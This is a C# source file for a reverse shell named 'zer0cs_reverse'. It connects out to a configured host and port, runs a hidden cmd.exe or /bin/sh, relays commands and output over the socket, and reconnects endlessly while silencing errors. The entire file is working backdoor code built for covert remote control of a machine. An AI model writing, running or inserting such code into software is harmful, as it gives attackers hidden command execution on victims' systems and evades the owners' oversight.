using System; 
using System.Net; 
using System.Net.Sockets; 
using System.Threading; 
using System.Diagnostics; 
using System.IO; 

namespace zer0cs_reverse {
    class zer0cs_reverse {
	
        // host to reverse connect
        private const String L_HOST= "127.0.0.1";
        
        // port to reverse connect
        private const int L_PORT = 4242;

        // reconnect after X seconds if no connection possible
        private const int RECONNECT_TIME = 6;
        
        public static void Main() {
        
            // switch between shells on different systems (add plattform dependent code here)
            String shell;
            switch (Environment.OSVersion.Platform.ToString()) {
                case "MacOSX":
                case "Unix": // this is Linux.  ;) If you need this hint -> not good
                    shell = "/bin/sh";
                    break;
                default:
                    shell =  Environment.GetEnvironmentVariable("windir") + "\\System32\\cmd.exe";
                    break;					
            }
            
            // endless main loop: we using() stream of TcpClient comfortable with stream reader / writer
            while (true) {
                try {
                    using(TcpClient tcpClient = new TcpClient(L_HOST, L_PORT)) {
                        using(Stream networkStream = tcpClient.GetStream()) {
                            using(StreamReader networkStreamReader = new StreamReader(networkStream)) {
                                StreamWriter networkStreamWriter = new StreamWriter(networkStream);
                                Process ps = new Process();
                                
                                // use the choosen shell
                                ps.StartInfo.FileName = shell;
                                
                                // for process I/O redirection
                                ps.StartInfo.UseShellExecute = false;
                                ps.StartInfo.RedirectStandardInput = true;
                                ps.StartInfo.RedirectStandardOutput = true;			 		
                                ps.StartInfo.RedirectStandardError = true;
                                
                                // shell process without window pls
                                ps.StartInfo.CreateNoWindow = true;
                                ps.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;		
                        
                                // set connection loop enabled
                                bool readFromNetworkStream = true;
                                                
                                // anonymous method to receive data asynchronous from stdout / stderr of shell process
                                // see: https://docs.microsoft.com/de-de/dotnet/api/system.diagnostics.datareceivedeventhandler?view=netframework-4.8
                                DataReceivedEventHandler sendback = (object sender, DataReceivedEventArgs e) => { 
                                    if (!String.IsNullOrEmpty(e.Data)) {
                                        try {
                                            networkStreamWriter.WriteLine(e.Data);
                                            networkStreamWriter.Flush();
                                            
                                        // error while write operation at network stream: force reconnnect
                                        #pragma warning disable 0168  // suppress warning of unused exception variable ex 
                                        } catch (Exception ex) {
                                        #pragma warning disable 0168
                                            readFromNetworkStream = false; // set stop reading from stream
                                        }
                                    }
                                };
                                ps.OutputDataReceived += sendback;
                                ps.ErrorDataReceived += sendback;
                                
                                // start process, beginn reading
                                ps.Start();
                                ps.BeginOutputReadLine();
                                
                                // read data from network stream to console stdin
                                while(readFromNetworkStream) {
                                    ps.StandardInput.WriteLine(networkStreamReader.ReadLine());
                                }
                            }
                        }
                    }
                
                // catch connection errors 
                #pragma warning disable 0168
                } catch (Exception ex) {}
                #pragma warning disable 0168
                
                // error happens before, maybe no connection possible, wait and reconnect
                Thread.Sleep(RECONNECT_TIME * 1000); // seconds to milliseconds
            }
        }
	}
}
